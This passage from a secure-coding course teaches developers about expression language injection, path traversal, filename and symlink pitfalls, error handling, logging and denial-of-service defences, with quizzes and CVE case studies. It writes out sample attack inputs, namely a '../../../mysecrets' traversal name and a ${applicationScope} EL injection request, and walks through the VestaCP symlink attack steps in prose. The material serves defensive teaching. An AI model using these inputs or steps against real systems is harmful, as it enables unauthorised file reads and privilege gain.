#### Quiz 3.3: OS Command (Shell) injection

\>\>Avoid unnecessarily calling an operating system shell when you simply want to run another program. True or False?<<

(x) True

( ) False

[Explanation]

This is true. Not only is it more efficient, but the operating system shell usually responds to a large number of special characters that you would need to deal with to use it securely. If you don’t need its additional functions, there is no point in calling through it. Of course, there may be cases where its additional capabilities are valuable to you; in those cases, you will need to be very careful and escape metacharacters to ensure that data is not misinterpreted.

[Explanation]

### Other Injection Attacks

There are many other kinds of injection attacks beyond SQL injection and operating system command injection. There may be a risk of an injection attack any time you are sending data partly controlled by an untrusted user in a format that has metacharacters, is defined as a language, and/or is processed by an interpreter.

Examples where there may be a risk of an injection vulnerability include generating and sending JSON, yaml, XML, Lightweight Directory Access Protocol (LDAP) commands, and many other formats to libraries, frameworks, and other components that you depend on, as well as outputting them to eventual users. In all cases, one solution is to use an API that automatically escapes the text as necessary, just like using parameterized statements when generating SQL.

One interesting variation of an injection attack occurs when some expression is unintentionally executed twice. This can occur, for example, in some uses of the expression language in the widely-used Spring Java framework, where the attack is called expression language injection. This vulnerability is remarkably common, so we’ll explain it further here.

An “Expression Language” (EL) was developed as part of the Java Server Pages Standard Tag Library (JSTL) to make it easy to get data from the underlying object model. For example, this:

> `<c:out value="person.address.street"/>`

Is a convenient shorthand for:

> `<%=HTMLEncoder.encode(((Person)person).getAddress().getStreet())%>`

The problem is that in some cases it’s possible to have the EL interpreted twice when using Spring given certain versions and configurations. For example, the tags `<spring:message>` and `<spring:theme>` may interpret twice the following attributes: `arguments`, `code`, `text`, `var`, `scope`, and `message`. For another example, `<spring:bind>` and `<spring:nestedpath>` may interpret twice the attribute `path`. When this is happening, as noted in “[Remote Code with Expression Language Injection](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)” by Amodio (2012), is that a request of the form:

> `http://vulnerable.com/foo?message=${applicationScope}`

to a page that contains:

> `<spring:message text="" code="${param['message']}"></spring:message>`

can result in output that contains internal server information including the classpath and local working directories.

Whether or not the problem happens depends on the version of Spring, its Java Server Pages /Servlet container (if present), and some configuration options. For more information, see "[Expression Language Injection](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)" by Di Paola and Dabirsiaghi (2011) and “[[Remote Code with Expression Language Injection](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)” by Amodio (2012).

Obviously it’s important to ensure that expressions are only evaluated as many times as expected (typically once). It’s wise to make sure the configuration does this, if there is a possible alternative. If there are any concerns, include tests in your automated test suite to verify that expressions are only being evaluated once in safe contexts, so that any future mistake will be immediately detected before being used in production. In the case of Spring, a test could supply data like `${99999+1}` in a risky construct and then ensure that the response text was the expected one (and not `100000`).

🔔 2021 CWE Top 25 #30 is [CWE-917](https://cwe.mitre.org/data/definitions/917.html), *Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')*.


### Filenames (Including Path Traversal and Link Following)

Technically, a “**pathname**” is a sequence of bytes that describes how to find a filesystem object. On Unix-like systems, including Linux, Android, MacOS, and iOS, a pathname is a sequence of one or more filenames separated by one or more “**/**”. On Windows systems, a pathname is more complicated but the idea is the same. In practice, many people use the term “filename” to refer to pathnames.

Pathnames are often at least partly controlled by an untrusted user. For example, it is often useful to use filenames as a key to identify relevant data, but this can lead to untrusted users controlling filenames. Another example is when monitoring or managing shared systems (e.g., virtual machines or containerized filesystems); in this case, an untrusted monitoree controls filenames. Even when an attacker should not be able to gain this kind of control, it is often important to counter this kind of problem as a defense-in-depth measure, to counter attackers who gain a small amount of control.



#### Path Traversal

An obvious case is that systems are often not supposed to allow access outside of some directory (e.g., a “document root” of a web server). For example, if a program tries to access a path that is a concatenation of “**trusted_root_path**” and “**username**”, the attacker might be able to create a username “.**./../../mysecrets**” and foil the limitations. This vulnerability, where an attacker can create filenames that traverse outside where it is supposed to, is so common that it has a name: *directory traversal vulnerabilities*. As always, use a very limited allowlist for information that will be used to create filenames. If your web application’s allowlist does not include “**.**”, “**/**”, “**~**”, and “**&#92;**”, on most systems it is significantly harder to traverse outside the intended directory root. Another common solution is to convert a relative path into a normalized absolute path in a way that eliminates all “**..**” uses and then ensure that the resulting path is still in the correct region of the filesystem.

> 😱 STORY TIME: SaltStack

> An example of a directory traversal vulnerability is [CVE-2020-11652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11652), a vulnerability in the SaltStack. SaltStack is a configuration management and orchestration tool for managing multi-computer infrastructure. In this vulnerability, a method failed to properly sanitize an input parameter, allowing “**..**” elements that were used to create a filename. The result was that attackers could cause entire sets of machines to execute commands of their choosing.

🔔 Path traversal is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #8 and 2019 CWE Top 25 #10. It is also identified as [CWE-22](https://cwe.mitre.org/data/definitions/22.html), *Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)*.

#### Windows Pathnames

Microsoft Windows pathnames can be extremely difficult to deal with securely. Windows pathname interpretations vary depending on the version of Windows and the API used (many calls use **CreateFile** which supports the pathname prefix “**\\.&#92;**” - and these interpret pathnames differently than the other calls that do not). Perhaps most obviously, “**letter:**” and “**\\server\share...**” have a special meaning in Windows. A nastier issue is that there are reserved filenames, whose form depends on the API used and the local configuration. The built-in reserved device names are as follows: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9. Even worse, drivers can create more reserved names - so you actually cannot know ahead-of-time what names are reserved. You should avoid creating filenames with reserved names, both with and without an extension; if an attacker can trick the program into reading/writing the name (e.g., **com1.txt**), it may (depending on API) cause read or write to a device instead of a file. In this case, even simple alphanumerics can cause disaster and be interpreted as metacharacters - this is rare, since usually alphanumerics are safe. Windows supports “**/**” as a directory separator, but it conventionally uses “**&#92;**” as the directory separator (which is annoying because **&#92;** is widely used as an escape character). In Windows, don’t end a file or directory name with a space or period; the underlying filesystem may support it, but the Windows shell and user interface generally do not. For more details, check the Microsoft Windows documentation on [*Naming Files, Paths, and Namespaces*](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN).

#### Unix/Linux Pathnames

Filenames and pathnames on Unix-like systems are not always easy to deal with either. On most Unix-like systems, a filename can be any sequence of bytes that does not include **\0** (the terminator) or slash. One common misconception is that Unix filenames are a string of characters. Unix filenames are not a string of one or more characters; they are merely a sequence of bytes, so a filename does not need to be a legal sequence of characters. For example, while it is a common convention to interpret filenames as a UTF-8 encoding of characters, most systems do not actually enforce this. Indeed, they tend to enforce nothing, so many problematic filenames can be created, including filenames with spaces (or only spaces), control characters (including newline, tab, escape, etc.), bytes that are not legal UTF-8, or

including a leading “**-**” (the marker for command options). These problematic filenames can cause trouble later.

Some potential problems with filenames are specific to the shell, but filename problems are not limited to the shell. A common problem is that “**-**” is the option flag for many commands, but it is a legal beginning of a filename.

A simple solution is to prefix all globs or filenames where needed with “**./**” so that they cannot begin with “**-**”. So for example, never use “**&#42;.pdf**” to refer to a set of PDFs if an attacker might influence a directory’s filenames; use “**./&#42;.pdf**”.

Be careful about displaying or storing pathnames, since they can include newlines, tabs, escape (which can begin terminal controls), or sequences that are not legal strings. On some systems, merely displaying filenames can invoke terminal controls, which can then run commands with the privilege of the one displaying.

#### File Handling (Including Link Following)

Once you have a pathname, you often want to do something with it, such as try to open that file.

As discussed in [“Beware of Race Conditions”](#beware-of-race-conditions), open files in ways that prevent time-of-check time-of-use (TOCTOU) race conditions. Open a file directly instead of querying if the access is permitted (since that may change). Include the “exclusive” option (“<tt>x</tt>” or `O_EXCL`) if you want to expressly require that the file be created. If you’re creating temporary files, use interfaces specifically designed to securely create temporary files.

If your software might open a file system object (including a directory) that an attacker might control, be prepared for it. One way this can happen that we have not yet discussed is improper link resolution.

Most operating systems support “hard links” and “symbolic links”... but many developers don’t know about them or don't account for them. A “hard link” creates another name that refers to the exact same underlying file system object, with the same ownership and permissions. A “symbolic link” (aka “symlink” or “soft link”) is a special file that contains a reference to another file or directory in the form of an absolute or relative path; an attempt to open the symbolic link will be redirected to open the reference instead. These can be very useful. However, if an attacker can create these links in a file system object your application might open, these links can also be a problem and applications must be prepared to deal with them.

You need to write code that is prepared for hard and symbolic links. In particular, do not assume that all files in a directory are necessarily owned by the owner of the directory. If your program has elevated privileges, you may need to temporarily drop those privileges before handling the filesystem. You can also open files using the `O_NOFOLLOW` option on Unix-like systems; this disables following symlinks on the last filename component (the basename), but only on the last component, and in some programming languages it takes extra steps to use the option.

Modern versions of Windows support hard links and symbolic links. However, creating them typically requires elevated privileges (e.g., admin or developer mode) so they are somewhat less likely as an attack method compared to Unix-like systems. These kinds of vulnerabilities still happen on Windows systems because privileged users can create them and some applications aren’t designed to use them correctly, leading to exploitable vulnerabilities.

There are two common measures you can take on Unix-like systems to harden them against many kinds of link-based attacks, although they do not counter all attacks:

1. All directories that are writable by multiple users should also have the “sticky” bit set. In most modern Unix-like systems, a directory with the “sticky” bit set restricts changes that are allowed in the directory. For example, on Linux systems the sticky bit means for any file in that directory, only the file's owner, the directory's owner, or root user can rename or delete the file. Normally on Unix-like systems insertion and renames of files in a directory can be done by all the users with write permission on the directory, regardless of the file owner. The sticky bit is typically already set for pre-existing shared directories like `/tmp` but you must specially set the sticky bit if you create new directories where writing is shared between users. The sticky bit makes some kinds of attacks harder to perform, including ones based on creating or changing links in that directory.
2. Where available, enable “protected sticky symlinks” (aka `protected_symlinks`). In systems with protected sticky symlinks, a symbolic link is only followed if it is outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink's owner.  Many Linux distributions enable this by default, including Ubuntu, Fedora, and Red Hat Enterprise Linux.

> 😱 STORY TIME: VestaCP Link Following Vulnerability (CVE-2021-30463)

> VestaCP is an open source hosting control panel (enabling users of a hosting service to manage their hosting package, e.g., purchase domain names, install applications, create and manage email accounts, and upload website files).  Unfortunately, VestaCP through version 0.9.8-24 allows attackers to gain privileges by creating symlinks to files for which they lack permissions, a vulnerability identified as [CVE-2021-30463](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-30463).

The fundamental problem is that the VestaCP application presumed that any files under the user home directory (directly or indirectly) were necessarily owned and controlled by the user. But this is not necessarily true in modern operating systems. In the vast majority of modern operating systems, hard and symbolic links enable other files to be referenced from them.

The details of this attack were described as follows ([SSD Disclosure, SSD Advisory – VestaCP LPE Vulnerabilities, March 20, 2021](https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/)). An attacker could go to their user web directory inside their home directory and create a directory with the name of the domain they wish to attack (e.g., *pwned.pwn*) that is controlled by the system. Inside that directory, the attacker would create another directory called `public_xhtml`. And inside `public_xhtml` the attacker would create a symlink (e.g., *pwn.pwn*) to the desired file the attacker wanted to read, e.g., the login secret in the admin account’s user.conf file. Also in the directory of the domain, *pwned.pwn*, the attacker would create symlinks to the folders which the attacker doesn’t have permission to access, e.g., `/usr/local/vesta/data/users` and `/usr/local/vesta/data/users/admin`. The attacker can then trigger the vulnerability by creating a domain with the name *pwned.pwn* in the /add/web URL of VestaCP. The attacker can now read the secret contents of the user.conf of admin, allowing the attacker to change the admin password.


🔔 2021 CWE Top 25 #31 is [CWE-59](https://cwe.mitre.org/data/definitions/59.html), Improper Link Resolution Before File Access ('Link Following').

#### Quiz 3.4: Filenames (Including Path Traversal and Link Following)

\>\>Select all the statements that are true.<<

[!] On Unix and Linux, filenames are a sequence of characters. {{ selected: No, in general filenames in Unix and Linux are a sequence of bytes, which may or may not map to any specific characters at all. Some specific implementations and filesystems require filenames to be a sequence of characters, but this is not true as a blanket statement. }}

[x] On Unix and Linux, filenames may contain control characters.

[x] On Unix and Linux, filenames with leading “**-**” characters can be a security problem. A simple solution is to prefix globs with “**./**” so that the first character cannot be a “**-**”.

[x] Path traversal occurs when an attacker can create filenames that traverse outside where they are supposed to, e.g., by embedding “**/../**”. A good way to counter this is to use a limited allowlist that prevents these attacks.

## Calling Other Programs: Other Issues

### Call APIs for Programs and Check What Is Returned

When writing programs, try to call only application programming interfaces (APIs) that are intended for use by programs.

Usually a program can invoke any other program, including those that are really designed only for human interaction. However, it is usually unwise to invoke a program intended for human interaction in the same way a human would. The problem is that programs’ human interfaces are intentionally rich in functionality and are often difficult to completely control. For example, interactive programs often have “escape” codes, which might enable an attacker to perform undesirable functions. Also, interactive programs often try to intuit the “most likely” defaults; this may not be the default you were expecting, and an attacker may find a way to exploit this.

Usually there are parameters to give you safer access to the program’s functionality, or a different API or application that is intended for use by programs; use those instead.

This goes the other way, too. If you are developing an application with an interactive user interface for humans, make sure there is a way for a program to directly access that functionality as well. That will make it much easier to integrate your application into something larger.

Of course, once you receive information, make sure that you check for error conditions (either directly or via raising an exception). If a request with untrusted data fails, your program should not just blithely go on as if it succeeded. Error handling is such an important topic that we will cover that next.

#### Quiz 3.5: Call APIs for Programs and Check What Is Returned

\>\>From a program, try to use same API used by humans, as that may be better tested. True or False?<<

( ) True

(x) False

[Explanation]

This is false. This would make it much harder to write code (and update it later). More importantly, human interfaces often change or make guesses that are inappropriate when trying to automate something.

[Explanation]

### Handling Errors

Real programs must handle errors. Many production programs are *mostly* error-handling, because there are so many problems that can happen in the real world.

Poor error handling can lead to security vulnerabilities. So let’s discuss common approaches to error handling and how to use them securely. Basically, this involves understanding their strengths and weaknesses, and being cautious about their weaknesses when using them.

> 😱 STORY TIME: Apple **goto fail; goto fail;**

> An example of a security vulnerability caused by bad error handling is [CVE-2014-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266), commonly called the “*goto fail; goto fail;*” vulnerability. This was a vulnerability in the Apple implementation of the SSL/TLS protocol in many versions of its operating systems. The problem was a second (duplicate) “**goto fail;**” statement in the function **SSLVerifySignedServerKeyExchange**, as follows:

~~~~C
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
      goto fail;
    goto fail;
    ... other checks ...
    fail:
      ... buffer frees (cleanups) ...
      return err;
~~~~

> The indentation here is misleading; since there are no curly braces after the **if** statement, the second “**goto fail**” is always executed. In context, that meant that vital signature checking code was skipped, so both bad and good signatures would be accepted. The extraneous “**goto**” caused the function to return 0 (“no error”) when the rest of the checking was skipped; as a result, invalid certificates were quietly accepted as valid. This was a disastrous vulnerability, since it meant that all sorts of invalid certificates would be accepted, completely compromising security. This vulnerability would be easily detected by an automated test suite. ([*The Apple goto fail vulnerability: lessons learned*](https://dwheeler.com/essays/apple-goto-fail.html), by David A. Wheeler, 2020).

#### Return Codes

One of the most common error-handling mechanisms are return codes. A return code is simply a single value that is *either* the return value of a method/function/procedure or a value that indicates an error. For example, “on success returns 0..INT_MAX, on error returns -1” or “on success returns a pointer, on error returns NULL”. In some cases, nothing is being returned (at least as its return value), so the return value is simply whether or not there was an error. Return codes are the usual approach in C, but return codes are used in many programming languages.

Obviously, when you are developing a program, you need to ensure that the return code is not a legitimate value, so that errors and normal values *can* be distinguished.

Return codes work, but they have many problems when maintaining software over time:

* They require the caller to check every return value for an error to handle it. These are easy to forget, and thus this is a common mistake.

* Every method may have different semantics (e.g., different values to indicate “error”). They are often **0**, **negative**, **INT_MAX**, **NULL**, or some other special value… but not always.

* If new types of errors are added, you must often check every caller to ensure they are handled correctly.

* They lead to functional logic and error handling being mixed together. This often creates more complex code, leading to mistakes and poorer productivity. In particular, such code often fails to deallocate resources if it must do so.

In most programming languages it is often better to use another mechanism (like exception handling) instead when you are creating the interface, because return codes so easily lead to mistakes over time. This is not practical in portable C, since C does not have many other mechanisms (e.g., C does not have a standard exception handling mechanism). So, if you are using C, consider moving the error handling to the end of the function. This separates error-handling from the functional logic and simplifies correct resource deallocation. A good explanation of this approach is in the [Linux kernel coding style guide](https://www.kernel.org/doc/Documentation/process/coding-style.rst).

When you are using an interface that uses return codes, make certain that you check every time there’s a return code if a failure might lead to a vulnerability. For example, about 35 billion Internet of Things (IoT) devices were found in 2021 to have disastrous security vulnerabilities due to inadequate cryptographic random number generation. This is in part because many IoT software developers directly called hardware random number generators (they shouldn’t do that), but even worse, they ignored error return codes from those generators (and they definitely shouldn’t do that). For more details about this example, see [You're Doing IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([presentation](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) by Dan Petro and Allan Cecil, a 2021 DEF CON presentation. We’ll discuss cryptographic random number generation in more detail later.

#### Exceptions

Most programming languages have an *exception handling mechanism* (though there are, er, exceptions!). This includes such diverse languages as Java, C#, Python, PHP (5+), Perl, Ruby, Tcl, JavaScript, C++, Ada, Smalltalk, Common Lisp, Scheme (6+), Erlang, and OCaml. In such systems, you can “throw” or “raise” an exception when an error is detected, and you can “catch” or “rescue” an exception to handle it; the stack is repeatedly unwound when an exception is thrown until there is a matching catch. Many languages define regions to catch (e.g., “try”).

If you are implementing the *top* level of a program or framework (e.g., its main event loop), you typically want to catch all exceptions (with perhaps a few, er, exceptions). Log the exception (with some details, except information like passwords that perhaps should be omitted from the log). Ensure that after the request or event has completed, including when an exception has been processed, that all resources have been returned if they should be. Finally, repeat the event loop to process the next event. Logging can aid debugging and intrusion detection. It is fine to tell the requestor that “there was a problem” while not providing many details; that is what the internal log is for.

Otherwise, you generally should be specific about the exceptions you catch, and only catch an exception if you can do something appropriate about it. Attackers will try to trigger exceptions, so make sure that exception handlers are secure.

#### Other Approaches for Error Handling

There are other error-handling approaches.

Some programming languages use type constructors that provide a return value that distinguishes normal values from error values. A good example of this is Haskell’s **Maybe**, which is defined as “**data Maybe a = Nothing | Just a**”. This means that a **Maybe** value must be either **Nothing** or **Just** a value. This approach is like an error return, but, because the type system distinguishes value from errors (non-values), you cannot accidentally ignore errors; you have to extract the value to get a result. Some programming languages also provide constructs to easily do this extraction and otherwise propagate the error, e.g., the [“?” operator in Rust](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html) and [optional chaining in Swift](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html). Of course, you could intentionally write code to skip the error value (e.g., **Nothing**); beware of doing so if this could have a security impact.

Some languages allow multi-value returns and use that for error handling. For example, Go’s error conventions do this. Functions can return multiple values, and one of them can be an error value. This avoids the risks of overloading values as compared to traditional return values. However, like return values, there is a risk you will forget to check the separate error return value. For more details, check out [*The Go Blog: Error handling and Go*](https://blog.golang.org/error-handling-and-go) (2011), by Andrew Gerrand.

#### Error Handling Wrap-up

Error-handling is a fact of life, but you need to make sure your error handling (not just your “main” line) is secure. It is easy to forget to detect or handle errors. Where you can, try to use approaches that are more likely to work correctly *even* as the program is changed by others.

#### Quiz 3.6: Handling Errors

\>\>Select all the true statement(s).<<

[!x] A common problem with traditional return codes is that it is easy to forget to check for the error.

[ ] You should catch all exceptions raised by the methods/functions you call. {{ selected: No, you should only catch an exception if you know what you will do with it. }}

[x] If an exception is raised all the way to the “top” of a program (e.g., its event loop), you should typically log that exception, and then decide if the program will halt or continue.

### Logging

The best way to deal with attacks is to prevent them from having any effect. Sadly, as we noted earlier, sometimes attackers get through our prevention measures. In those cases, we need to detect the attack and then recover from it. Detection is vital, because we often won’t know to trigger recovery until we detect a problem.

A key mechanism that enables detection is some sort of logging system. The logs can then be monitored, along with other indicators, to detect ongoing attacks. In practice, logs from different applications are often sent to some protected centralized capability to simplify analysis (because all that data will be in one place) and protect log history even when an application is subverted. This course will not specifically cover how to monitor logs to detect successful attacks. Instead, we will focus on how to send information to logs to enable others (programs and humans) to do that detection.

When building an application, you should generally send detailed data to the logs instead of revealing problem details to untrusted users. It is fine to say there is a problem, but don’t say too much; attackers love it when you give them detailed data about their attacks! The logs should generally record important events, including their success or failures. Examples include login successes, login failures, and logouts. Also include anything that might possibly indicate an attack or attempt to work around defenses. Make sure you provide different categories or importance levels so that the amount of logging information can be controlled at runtime.

Since logging is so important, many applications use some sort of logging system implemented by an external library or application. Typically, you should try to reuse existing log systems; that’s less code to write, easier to integrate with other systems, and so on. If you absolutely must implement your own system, you should generally record for each event the date/time (with sub-second accuracy), the source (machine and application), a category, and details about the event.

Once again, logging is a security mechanism that can itself become a security vulnerability. So do have a logging system in a larger application, but implement it in a way that counters those potential vulnerabilities.

Data for logs often includes data from untrusted users, and attackers may intentionally create data to attack the logging system or later systems that process log data. They may try to insert data that will crash or take over the logging system, forge log entries, or create attacks on the log retrieval system. Log forging is a particularly common problem, and you do not want to build a system that lets attackers frame others. To resolve this, you need to ensure that all untrusted data sent to a log will be escaped or sanitized when it is stored. Many logging APIs already do this - make sure it does, and if you have a choice, strongly prefer using APIs that do this for you. If you don’t have a choice, consider implementing a *wrapper* to automatically and safely encode the log data so that the problem is automatically prevented.

Greatly limit who can read the logs; they generally should not be readable by all. However, even doing this is not enough.

As a general rule, don’t include passwords or very sensitive data in logs. Since people may need to review logs later, log data sometimes gets out to more people than you might expect. Sometimes logs are revealed to others, and the recipient may use the logs in unauthorized ways. Beware of including data if it might include passwords or private keys! If you must include possibly-sensitive data, consider logging the data as an encrypted or cryptographically hashed value, so that people who receive the log cannot easily use it in an unauthorized way.

🔔 *Security Logging and Monitoring Failures* is 2021 OWASP Top 10 #9. *Insufficient logging and monitoring* is 2017 OWASP Top 10 #10. *Inclusion of Sensitive Information in Log Files*, [CWE-532](https://cwe.mitre.org/data/definitions/532.html), is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #39 and 2019 CWE Top 25 #35.

#### Quiz 3.7: Logging

\>\>Select all the true statement(s).<<

[!] In general, logged information should also be displayed to the user who triggered it to speed debugging {{ selected: Absolutely not; the logs may contain sensitive or secret information, and users are often not fully trusted. Instead, report to the user what the user needs to know (e.g., “operation did not work”... and put the details in the logs. }}

[ ] Logging is often unnecessary because it is better to develop a system that is not vulnerable in the first place. {{ selected: It is great to develop a system without vulnerabilities. Since there is no way to be absolutely certain that is true, we need logging to enable detection of a problem, so that we can then respond to the issue. }}

[x] Logs should generally include much more detail, but beware of including passwords and private keys, since logs are sometimes visible to many others. If you must include this data, consider including it as an encrypted or cryptographically-hashed value.

[x] Your log system may need to record data from an attacker, so make sure your logging system is not vulnerable to a “log forging” attack (where an attacker provides data that causes the recorded log to be misleading in some way).

### Debug and Assertion Code

Sometimes vulnerabilities stem from debug and assertion code; let’s talk about that.

#### Debug Code

Developers often insert code solely to gain visibility of what is going on. For example, when debugging, they may insert print statements. They may also do it to simplify testing or simply to gain understanding. By itself, that is fine, but there is a risk of leaving this debug code enabled in production. These are much more likely to lead to defects and security vulnerabilities, since they were not intended to be there in the released software.

So if you insert debug code, segregate it somehow so it is *easy* to automatically remove. It doesn’t matter how; naming conventions, compiler flags, and so on, can all work, as long as it is easy to do the *right* thing.

A good long-term strategy is to have a logging system enabled early, and either use that or transform your debug statements into logging statements. If you find it useful to see information now, it might be useful to see that later. That also means that instead of needing to remove the debug code, you can easily enable it later, even within a production system. This logging code must resist attack, just like the rest of the code.

#### Assertions

Many languages have “assert” statements or expressions to state something that is *supposed* to always be true at runtime. These can be useful for sanity checking of a program while it runs. Examples include Java’s **assert** statement, Python’s **assert** statement, C/C++/Rust’s **assert()** macro, and JavaScript Node.js’s **assert()** method. In most languages, if the assertion fails at runtime, then an exception is thrown.

Assertions are often great, because they can stop problems before they get more serious. However, if an attacker can cause an assertion to fail, that may lead to application exit or other behavior more severe than necessary. In particular, where practical:

* Avoid allowing an attacker to trigger an assertion. In particular, *never* use assertions for input validation of untrusted input. There are at least two good reasons:

    1. Countering attacker input is *expected* behavior!

    2. Assertions can often be disabled with compiler or runtime flags. This violates the principle of having non-bypassable input validation for security, because a perfectly reasonable optimization approach can accidentally disable a vital security need.

* Limit scope of the assertion response (exception handler) to the attacker’s session where you can. For example, try to crash just that connection, not all connections, if an assertion fails.

🔔 A *Reachable Assertion* (an assertion an attacker can trigger), [CWE-617](https://cwe.mitre.org/data/definitions/617.html), is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #40.

Inserting assertions can make a verification technique called “fuzzing” more effective. So, it is often a good idea to have many assertions, as long as they are expressions that absolutely *should* always be true. We will discuss fuzzing in more detail later.

#### Quiz 3.8: Debug and Assertion Code

\>\>Select all the true statement(s).<<

[!x] If you insert debug code, make it easy to automatically remove or turn it into a logging statement.

[ ] Use an assertion to determine if an untrusted input meets the input criteria.

[x] Assertions can make other verification techniques more effective.

### Countering Denial-of-Service (DoS) Attacks

Secure systems should be available to authorized users even while under attack. This is especially difficult if your system can be accessed via the public internet. Attackers may be able to launch a distributed DoS (DDoS) attack from many systems they control, creating millions or billions of requests. If an attacker has many resources, you may not be able to counter the attack *except* by using significant resources (including money) to handle the workload.

One approach is to design your system to be able to handle larger amounts of traffic. That way, attacker requests will simply be handled. Design your system to be scalable (e.g., through containerization) and deploy on a cloud system where you can automatically (or at least rapidly) scale up to much larger sizes if there is demand. Use caches, Content Delivery Networks (CDNs), and minimize execution time per request so that more requests can be handled each second. Consider using a static site where this kind of website is a viable option. There are many ways to minimize execution time (aka increase performance); for many systems, maximal use of database indexes and eliminating so-called “N+1” queries is a good first step.

However, at some point an attacker who controls enough resources will be able to overwhelm most services unless you are willing to spend a large amount of money to handle them. So another approach is to rapidly recover from excessive attacker-caused demand. Make sure your restart can be automated and that your system can restart relatively quickly. Where it is sensible, have a “backoff” mode (e.g., a read-only mode or separate service) so that *some* services are available during an aggressive attack.

Another way to make DoS attacks more difficult is to reduce the amount of resources your application requires. If resources are temporarily required (e.g., file handles, etc.), make sure their allocation and consumption is controlled and that they are returned when no longer needed. In addition, avoid “losing” resources. Memory is a resource automatically managed by many languages, but many other resources are not or are easily lost. If you have to manually return a resource in a language with exception handling, ensure that the resources are returned *even* when an exception is thrown.

🔔 There are several kinds of (related) resource handling vulnerabilities, and any of them can eventually lead to a denial of service. What is more, they are common problems:

* *Uncontrolled Resource Consumption* ([CWE-400](https://cwe.mitre.org/data/definitions/400.html)) is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #27 and 2019 CWE Top 25 #20.

* This is highly related to having a missing release of resources, 2019 CWE Top 25 #21, [CWE-772](https://cwe.mitre.org/data/definitions/772.html), *Missing Release of Resource after Effective Lifetime*.

* *Allocation of Resources Without Limits or Throttling* ([CWE-770](https://cwe.mitre.org/data/definitions/770.html)) is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #40 and 2019 CWE Top 25 #39.

An obvious but surprisingly common problem is loops where an attacker can cause the exit condition to never occur, causing the program to get stuck in an infinite loop without getting work done.

🔔 Loops with unreachable exit conditions are 2019 CWE Top 25 #26, [CWE-835](https://cwe.mitre.org/data/definitions/835.html).

Make sure that you have backups of important datasets and a workable recovery process. That way, if an attacker manages to shut down the whole system, the data loss will be minimized. If necessary, you could even restart the service somewhere else or in some other form using the backups. You should have multiple backups, and at least some older ones should be in *cold storage* (that is, the backups cannot be modified by a later computer attack). That way, if newer backups are corrupted by an attacker (such as by using a ransomware attack), there are backups that can still be used.

#### Quiz 3.9: Countering Denial-of-Service (DoS) Attacks

\>\>Select all the approaches that might help counter denial-of-service (DoS) attacks if your service is accessible on the public internet:<<

[!x] Minimize execution time per request.

[x] Use a content delivery network (CDN).

[x] Prevent the loss of the resources required by the system.

[x] Reduce the time required to restart the system.

[ ] None of the above

# Sending Output

This chapter describes how to send output securely, including how to counter cross-site scripting (XSS) attacks, using HTTP hardening headers, and securely using formatting systems.

Learning objectives:

1. Discuss how to securely send output.

2. Explain how to counter Cross-Site Scripting (XSS) attacks.

3. Use HTTP hardening headers, including Content Security Policy (CSP).

4. Explain how to prevent other common output-related vulnerabilities in web applications.

5. Understand how to securely use format strings and templates.

6. Understand how to address other common output-related vulnerabilities.

### Introduction to Sending Output

Eventually, programs need to send output somewhere. It could be a reply to a request, a display to a user, storing information in a database, or anything else that returns a result.

Everything we learned about sending information to other programs also applies here. For example, you will often need to be sanitizing, escaping, and/or normalizing the output you send back to some user.

A quick rule-of-thumb is that you should try to minimize the information your program shows to an untrusted user, especially if it is security-related:

* If your program requires some sort of user authentication (such as many with a network connection), give the user as little information as possible before they authenticate. In particular, avoid giving away the version number of your program before authentication, unless this is easy to find anyway or it is the only instance of the program. Otherwise, if a particular version of your program is found to have a vulnerability, then users who don’t upgrade from that version advertise to attackers that they are vulnerable.

* If a login fails, note that it failed, but in general don’t say why. For example, don’t say that the username is wrong, unless the attacker can get usernames anyway as public information. Never say a password is “almost” correct; it is correct or it is not.

* Don’t show passwords on the screen by default. For example, in HTML, use the “password” data type, because that normally replaces each password character with a dot. Otherwise, an attacker shoulder-surfing behind the user could get this information, or the information might accidentally be revealed by a user making a video.

* If you must display some sensitive information in a form, make that a separate page or have a button that can hide/reveal that information. Try to make hiding the sensitive information the default. Again, this helps counter shoulder-surfing and accidental revelation of information.

* Minimize inline code comments sent to users; this wastes network traffic and might accidentally reveal information. If you are using JavaScript, minification can help prevent this.

Your program should also be prepared to handle attackers who intentionally reject or very slowly accept the output. Otherwise, an attacker might be able to make your program unresponsive to other users, simply by clogging some output. Implementations that use asynchronous communications are usually much less vulnerable to this, but any implementation *can* have this problem. Basically, make sure an attacker cannot clog a system by halting or slowing their web browser, having an intentionally slow TCP/IP connection, and so on. In short, don’t create an easy opportunity for a Denial-of-Service attack. Here are some tips:

* Release locks quickly, preferably before replying with *any* output.

* Use timeouts on network-oriented writes.

* Measure the time from the start of your attempt – it is ok to halt in the middle if it is suspiciously slow.

You should follow the standing conventions of the system you are using where possible, since often other components depend on that. In particular, on the web, the **GET** and **HEAD** methods of HTTP should not take any permanent action by themselves; they should be just retrieving information. The **GET** method, in particular, can be caused by a simple click on a hyperlink in a static page, and should not involve anything permanent like buying or selling. Instead, use other methods (like **POST**, **PUT**, and **DELETE**) to indicate permanent changes. The HTTP protocol can’t enforce this, but it is the standard convention, and many tools assume it, so you should also apply this rule where practical.

